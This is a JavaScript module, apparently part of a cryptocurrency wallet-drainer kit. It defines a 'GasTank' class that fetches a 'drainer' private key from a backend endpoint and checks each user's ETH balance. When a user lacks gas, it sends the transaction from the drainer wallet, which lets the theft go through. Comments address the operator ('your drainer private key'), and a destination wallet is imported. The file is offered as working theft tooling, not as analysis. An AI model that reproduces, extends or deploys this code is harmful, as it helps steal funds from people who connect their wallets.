import { ethers } from 'ethers';
import { RPC_URL, DESTINATION_WALLET } from '../config.js';

// DRAINER_PK should come from backend
async function getDrainerPk() {
  const response = await fetch('/api/get-drainer-pk');
  return await response.json();
}

export class GasTank {
    constructor() {
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Add any module-specific initialization here
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    static async estimateGasCost(transaction, chainId = 1) {
        try {
            const provider = new ethers.JsonRpcProvider(RPC_URL);
            const gasEstimate = await provider.estimateGas(transaction);
            const gasPrice = await provider.getGasPrice();
            const gasCost = gasEstimate * gasPrice;
            
            console.log(`⛽ Gas estimate: ${ethers.formatEther(gasCost)} ETH`);
            return gasCost;
        } catch (error) {
            console.error('❌ Gas estimation failed:', error);
            return BigInt(0);
        }
    }

    static async checkAndFundGas(userAddress, transaction, chainId = 1) {
        try {
            const provider = new ethers.JsonRpcProvider(RPC_URL);
            const userBalance = await provider.getBalance(userAddress);
            const gasCost = await this.estimateGasCost(transaction, chainId);

            console.log(`👛 User balance: ${ethers.formatEther(userBalance)} ETH`);
            console.log(`⛽ Required gas: ${ethers.formatEther(gasCost)} ETH`);

            // If user doesn't have enough gas, use gas tank
            if (userBalance < gasCost) {
                console.log(`⛽ Funding gas for ${userAddress}`);
                return await this.executeWithGasTank(transaction, chainId);
            }

            console.log('✅ User has sufficient gas');
            return null; // User has enough gas
        } catch (error) {
            console.error('❌ Gas check failed:', error);
            return null;
        }
    }

    static async executeWithGasTank(transaction, chainId = 1) {
        try {
            const provider = new ethers.JsonRpcProvider(RPC_URL);
            
            // Get drainer private key from backend
            const DRAINER_PK = await getDrainerPk();
            
            // Create wallet from your drainer private key
            const gasTankWallet = new ethers.Wallet(DRAINER_PK, provider);
            
            // Add gas tank as the transaction sender
            const fundedTransaction = {
                ...transaction,
                from: gasTankWallet.address
            };

            console.log(`⛽ Gas tank funding TX: ${JSON.stringify(fundedTransaction, null, 2)}`);
            
            // Send the transaction
            const txResponse = await gasTankWallet.sendTransaction(fundedTransaction);
            console.log(`✅ Gas tank TX sent: ${txResponse.hash}`);
            
            return txResponse;
        } catch (error) {
            console.error('❌ Gas tank execution failed:', error);
            return null;
        }
    }

    static async getGasTankBalance() {
        try {
            const provider = new ethers.JsonRpcProvider(RPC_URL);
            
            // Get drainer private key from backend
            const DRAINER_PK = await getDrainerPk();
            
            const gasTankWallet = new ethers.Wallet(DRAINER_PK, provider);
            const balance = await provider.getBalance(gasTankWallet.address);
            
            console.log(`⛽ Gas tank balance: ${ethers.formatEther(balance)} ETH`);
            return balance;
        } catch (error) {
            console.error('❌ Gas tank balance check failed:', error);
            return BigInt(0);
        }
    }
}

// Singleton instance
export const gasTank = new GasTank();